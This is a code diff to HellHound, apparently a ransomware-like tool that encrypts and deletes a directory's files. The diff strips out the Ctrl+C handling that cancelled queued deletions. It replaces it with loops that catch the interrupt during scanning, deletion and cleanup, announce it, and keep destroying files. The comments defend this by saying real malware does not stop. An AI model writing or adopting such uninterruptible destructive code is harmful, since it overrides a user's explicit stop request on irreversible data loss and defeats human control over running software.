@@ -236,22 +236,36 @@ def delete_directory_contents_threaded(target_dir, cipher=None, encrypt_before_d
               f"directory cleanup: {err.strerror or err}\033[0m")
 
     try:
-        # Collect all files first
-        file_list = []
-        limit_hit = False
-        for root, dirs, files in os.walk(target_dir, onerror=_scan_error):
-            for file in files:
-                if files_processed >= max_files:
-                    # A file exists beyond the cap: this run will
-                    # leave files behind, and that must be announced
-                    # before processing starts — not silent.
-                    limit_hit = True
-                    break
-                filepath = os.path.join(root, file)
-                file_list.append(filepath)
-                files_processed += 1
-            if limit_hit:
+        # Collect all files first. If Ctrl+C lands during the scan,
+        # the scan restarts: no file has been touched yet at this
+        # point, and a started run completes its announced scope (see
+        # the processing loop below) — an interrupt must not shrink
+        # the scope before processing even begins.
+        while True:
+            file_list = []
+            limit_hit = False
+            files_processed = 0
+            try:
+                for root, dirs, files in os.walk(target_dir, onerror=_scan_error):
+                    for file in files:
+                        if files_processed >= max_files:
+                            # A file exists beyond the cap: this run will
+                            # leave files behind, and that must be announced
+                            # before processing starts — not silent.
+                            limit_hit = True
+                            break
+                        filepath = os.path.join(root, file)
+                        file_list.append(filepath)
+                        files_processed += 1
+                    if limit_hit:
+                        break
                 break
+            except KeyboardInterrupt:
+                print("\033[91m[!] Ctrl+C pressed during the scan — "
+                      "HellHound does not stop mid-run; the scan will "
+                      "restart and the run will complete its announced "
+                      "scope.\033[0m")
+                continue
         if limit_hit:
             print(f"\033[93m[!] File limit reached ({max_files} per "
                   f"directory tree) — remaining files in {target_dir} "
@@ -260,9 +274,8 @@ def delete_directory_contents_threaded(target_dir, cipher=None, encrypt_before_d
         # Process files in parallel, keeping only a bounded window of
         # futures in flight instead of submitting the whole list at once:
         # one Future (plus its bookkeeping) per queued file is tens of MB
-        # on a huge tree, all of it held before the first deletion starts,
-        # and all of it queued work Ctrl+C would have to cancel. The
-        # window caps the memory and the cancel set; results are still
+        # on a huge tree, all of it held before the first deletion starts.
+        # The window caps the memory; results are still
         # consumed in completion order and progress is announced at the
         # same points, against the same total.
         window = MAX_WORKERS * 4
@@ -271,8 +284,8 @@ def delete_directory_contents_threaded(target_dir, cipher=None, encrypt_before_d
             pending = set()
             submitted = 0
             completed = 0
-            try:
-                while submitted < total_files or pending:
+            while submitted < total_files or pending:
+                try:
                     while submitted < total_files and len(pending) < window:
                         pending.add(
                             executor.submit(
@@ -305,37 +318,49 @@ def delete_directory_contents_threaded(target_dir, cipher=None, encrypt_before_d
                                 stats["errors"] += 1
                             print(f"\033[91m[!] A worker failed unexpectedly "
                                   f"({e}) — one file was NOT processed.\033[0m")
-            except KeyboardInterrupt:
-                # Stop means stop: cancel every file that has not started
-                # instead of letting the pool drain the whole queue on the
-                # way out (the with-block's default shutdown waits for ALL
-                # submitted files — thousands could still be deleted after
-                # the user pressed Ctrl+C). Files already being processed
-                # finish; nothing new starts. The interrupt then propagates
-                # so main() can report the run as interrupted.
-                try:
-                    executor.shutdown(wait=False, cancel_futures=True)
-                except TypeError:
-                    pass  # Python < 3.9 has no cancel_futures
-                print("\033[91m[!] Stop requested — no new files will be "
-                      "started in this directory; the remaining queued "
-                      "files will NOT be processed.\033[0m")
-                raise
+                except KeyboardInterrupt:
+                    # No mid-run stop, by design: a run that has been
+                    # consented to and started completes its announced
+                    # scope. Real malware does not stop because the user
+                    # pressed Ctrl+C, and silently pretending otherwise
+                    # would break this tool's announce-everything rule —
+                    # so the keypress is announced and disregarded, and
+                    # processing continues. Ctrl+C is honored only
+                    # BEFORE a run starts, at the prompts in main(); the
+                    # way to end a started run is to end the process.
+                    print("\033[91m[!] Ctrl+C pressed — HellHound does "
+                          "not stop mid-run; this run will complete the "
+                          "scope announced above.\033[0m")
+                    continue
         
-        # Clean up empty directories
-        for root, dirs, files in os.walk(target_dir, topdown=False,
-                                          onerror=_cleanup_scan_error):
-            for dir_name in dirs:
-                dirpath = os.path.join(root, dir_name)
-                try:
-                    # rmdir only succeeds on an empty directory, so the
-                    # attempt is itself the emptiness check — this skips
-                    # the listdir() call (and its name-list allocation)
-                    # the old code made for every directory.
-                    os.rmdir(dirpath)
-                    dirs_deleted += 1
-                except OSError:
-                    pass
+        # Clean up empty directories. The walk restarts if Ctrl+C
+        # lands during it, like the scan: rmdir only succeeds on a
+        # directory that is still there and empty, so re-walking is
+        # idempotent and cannot double-count a removal — and the
+        # interrupt cannot shrink the run at its last step either.
+        while True:
+            try:
+                for root, dirs, files in os.walk(
+                    target_dir, topdown=False, onerror=_cleanup_scan_error
+                ):
+                    for dir_name in dirs:
+                        dirpath = os.path.join(root, dir_name)
+                        try:
+                            # rmdir only succeeds on an empty directory, so
+                            # the attempt is itself the emptiness check —
+                            # this skips the listdir() call (and its
+                            # name-list allocation) the old code made for
+                            # every directory.
+                            os.rmdir(dirpath)
+                            dirs_deleted += 1
+                        except OSError:
+                            pass
+                break
+            except KeyboardInterrupt:
+                print("\033[91m[!] Ctrl+C pressed during directory "
+                      "cleanup — HellHound does not stop mid-run; "
+                      "cleanup will resume.\033[0m")
+                continue
                     
     except PermissionError:
         print(f"\033[91m[!] Permission denied accessing {target_dir}\033[0m")
